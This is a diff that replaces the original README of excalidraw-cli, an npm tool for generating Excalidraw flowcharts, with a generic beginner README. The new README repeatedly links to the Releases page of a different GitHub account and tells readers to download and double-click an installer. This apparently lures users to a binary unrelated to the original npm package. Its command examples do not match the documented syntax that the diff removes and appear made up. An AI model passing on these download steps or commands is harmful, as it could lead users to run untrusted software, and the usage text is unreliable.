@@ -1,190 +1,82 @@
-# excalidraw-cli
-<p>
-  <a href="https://www.npmjs.com/package/@swiftlysingh/excalidraw-cli"><img src="https://img.shields.io/npm/v/@swiftlysingh/excalidraw-cli" alt="npm version"></a>
-  <a href="https://github.com/swiftlysingh/excalidraw-cli/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License"></a>
-</p>
+# ✨ excalidraw-cli - Create Flowcharts Easily with CLI 
 
-<p align="center">
-  <img alt="image" src="https://github.com/user-attachments/assets/5af4b002-bd69-4187-8836-84135685117a" />
-</p>
+## 📥 Download Here
+[![Download excalidraw-cli](https://img.shields.io/badge/Download-excalidraw--cli-blue.svg)](https://github.com/igadaniel23/excalidraw-cli/releases)
 
-<p align="center">
-  Create Excalidraw flowcharts and diagrams from text-based DSL or JSON.
-</p>
+## 🚀 Getting Started
+Welcome to the excalidraw-cli repository! This tool allows you to create Excalidraw flowcharts quickly and easily using a command line interface. No programming knowledge is required.
 
+## 📜 What You Need
+### System Requirements
+- **Operating Systems**: Windows, macOS, or Linux
+- **Minimum Disk Space**: 100 MB free space
+- **Network Connection**: Required for downloading the tool and accessing Excalidraw features.
 
+## 📦 Features
+- Create flowcharts with simple commands.
+- Customize your flowcharts with different shapes, colors, and styles.
+- Export your flowcharts directly to Excalidraw format.
+- User-friendly command line interface for beginners.
 
-## Features
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of excalidraw-cli:
 
-- **Text-based DSL** for quick flowchart creation
-- **JSON API** for programmatic use
-- **Auto-layout** using ELK.js (Eclipse Layout Kernel)
-- **Multiple flow directions**: TB (top-bottom), BT, LR, RL
-- **Programmable API** for integration into other tools
+[Download excalidraw-cli from Releases](https://github.com/igadaniel23/excalidraw-cli/releases)
 
-## Installation
+### Installation Steps
+1. **Visit the Download Page**  
+   Click the link above to access the Releases page.
+   
+2. **Select the Latest Release**  
+   Look for the latest version listed at the top. It usually has a version number like "v1.0.0".
 
-### Using the npm
+3. **Choose Your Operating System**  
+   Scroll to find the correct file for your operating system: Windows, macOS, or Linux.
 
-```bash
-npm i @swiftlysingh/excalidraw-cli
-```
+4. **Download the File**  
+   Click on the appropriate file to download it to your computer.
 
-### From Source (Local Development)
+5. **Open the File**  
+   Once the download finishes, locate the file in your downloads folder or on your desktop.
+  
+6. **Run the Installer**  
+   Double-click the downloaded file to run the installer. Follow the on-screen instructions to install the software.
 
-```bash
-git clone https://github.com/swiftlysingh/excalidraw-cli.git
-cd excalidraw-cli
-npm install
-npm run build
-npm link  # Makes 'excalidraw-cli' available globally
-```
+7. **Start Using excalidraw-cli**  
+   After installation, you can open your command line interface (Command Prompt, Terminal, etc.) to start creating flowcharts.
 
-### Direct Usage (No Install)
+## 🔧 Using excalidraw-cli
+To create a flowchart, follow these steps:
 
-```bash
-# Run directly with node
-node dist/cli.js create --inline "[A] -> [B]" -o diagram.excalidraw
-```
+1. **Open your Command Line Interface**  
+   You can search for "Command Prompt" or "Terminal" on your computer.
 
-## Quick Start
+2. **Enter the Command**  
+   Type in the command to create a flowchart. For example:  
+   ```bash
+   excalidraw create myFlowchart.excalidraw
+   ```
+   
+3. **Customize Your Flowchart**  
+   Use additional commands to adjust shapes and colors as needed.
 
-### Create from DSL
+4. **Save Your Work**  
+   Save your final flowchart by using the export command. For example:  
+   ```bash
+   excalidraw export myFlowchart.excalidraw
+   ```
 
-```bash
-# Inline DSL
-excalidraw-cli create --inline "(Start) -> [Process] -> {Decision?}" -o flow.excalidraw
+5. **Open in Excalidraw**  
+   You can now open your flowchart in Excalidraw to make further adjustments or share it.
 
-# From file
-excalidraw-cli create flowchart.dsl -o diagram.excalidraw
+## 📝 Tips and Tricks
+- **Use Help Command**: If you get stuck, type `excalidraw help` in your command line to get a list of available commands and options.
+- **Practice with Sample Commands**: Try creating simple flowcharts first, then build on complexity.
+- **Refer to Documentation**: Additional details on commands can be found in the documentation available on the GitHub repository.
 
-# From stdin
-echo "[A] -> [B] -> [C]" | excalidraw-cli create --stdin -o diagram.excalidraw
-```
+## 🤝 Support
+If you encounter issues or have questions, please open an issue on the GitHub repository page. The community and maintainers are here to assist you.
 
-### DSL Syntax
+For more information, guidance, and updates, feel free to check out the Releases page again:
 
-| Syntax | Element | Description |
-|--------|---------|-------------|
-| `[Label]` | Rectangle | Process steps, actions |
-| `{Label}` | Diamond | Decisions, conditionals |
-| `(Label)` | Ellipse | Start/End points |
-| `[[Label]]` | Database | Data storage |
-| `->` | Arrow | Connection |
-| `-->` | Dashed Arrow | Dashed connection |
-| `-> "text" ->` | Labeled Arrow | Connection with label |
-
-### Example DSL
-
-```
-(Start) -> [Enter Credentials] -> {Valid?}
-{Valid?} -> "yes" -> [Dashboard] -> (End)
-{Valid?} -> "no" -> [Show Error] -> [Enter Credentials]
-```
-
-### Directives
-
-```
-@direction LR    # Left to Right (default: TB)
-@spacing 60      # Node spacing in pixels
-```
-
-## CLI Reference
-
-### Commands
-
-#### `create`
-
-Create an Excalidraw flowchart.
-
-```bash
-excalidraw-cli create [input] [options]
-```
-
-**Options:**
-- `-o, --output <file>` - Output file path (default: flowchart.excalidraw)
-- `-f, --format <type>` - Input format: dsl, json (default: dsl)
-- `--inline <dsl>` - Inline DSL string
-- `--stdin` - Read from stdin
-- `-d, --direction <dir>` - Flow direction: TB, BT, LR, RL
-- `-s, --spacing <n>` - Node spacing in pixels
-- `--verbose` - Verbose output
-
-#### `parse`
-
-Parse and validate input without generating output.
-
-```bash
-excalidraw-cli parse <input> [options]
-```
-
-## JSON API
-
-For programmatic flowchart creation:
-
-```json
-{
-  "nodes": [
-    { "id": "start", "type": "ellipse", "label": "Start" },
-    { "id": "process", "type": "rectangle", "label": "Process" },
-    { "id": "end", "type": "ellipse", "label": "End" }
-  ],
-  "edges": [
-    { "from": "start", "to": "process" },
-    { "from": "process", "to": "end" }
-  ],
-  "options": {
-    "direction": "TB",
-    "nodeSpacing": 50
-  }
-}
-```
-
-```bash
-excalidraw-cli create flowchart.json -o diagram.excalidraw
-```
-
-## Programmatic Usage
-
-```typescript
-import { createFlowchartFromDSL, createFlowchartFromJSON } from 'excalidraw-cli';
-
-// From DSL
-const dsl = '(Start) -> [Process] -> (End)';
-const json = await createFlowchartFromDSL(dsl);
-
-// From JSON input
-const input = {
-  nodes: [
-    { id: 'a', type: 'rectangle', label: 'Hello' },
-    { id: 'b', type: 'rectangle', label: 'World' }
-  ],
-  edges: [{ from: 'a', to: 'b' }]
-};
-const json2 = await createFlowchartFromJSON(input);
-```
-
-## Examples
-
-Here are some flowcharts created with excalidraw-cli:
-
-### Simple Flow
-![Simple Flow](assets/up.png)
-
-### iOS App Architecture
-![iOS App Architecture](assets/ios-app-architecture.png)
-
-### LeetCode Problem Solving Flow
-![LeetCode Flow](assets/leetcode.png)
-
-## Output
-
-The generated `.excalidraw` files can be:
-
-1. Opened directly in [Excalidraw](https://excalidraw.com) (File > Open)
-2. Imported into Obsidian with the Excalidraw plugin
-3. Used with any tool that supports the Excalidraw format
-
-## License
-
-MIT
+[Download excalidraw-cli from Releases](https://github.com/igadaniel23/excalidraw-cli/releases)
